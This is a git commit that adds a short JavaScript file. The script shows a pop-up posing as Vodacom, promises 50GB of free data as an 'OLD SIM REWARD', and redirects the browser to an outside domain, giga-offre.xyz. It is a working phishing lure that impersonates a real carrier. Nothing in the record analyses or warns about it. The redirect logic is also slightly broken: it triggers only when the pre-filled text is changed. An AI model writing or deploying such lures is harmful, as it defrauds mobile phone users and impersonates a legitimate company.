78feba85a231c9f17b2af177db5a7440693d51d4
bigetijazz5 <bigetijazz5@gmail.com>
2024-11-20 23:19:43 -0800

    Create vodacomsms.js

---
+++ vodacomsms.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 50GB'
+password=prompt('Vodacom: Congratulations, Your mobile Number is Eligible to receive 50GB free Data Vodacom OLD SIM REWARD, kindly press Ok to proceed now','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://www.giga-offre.xyz/Vodacom50gb';
+}
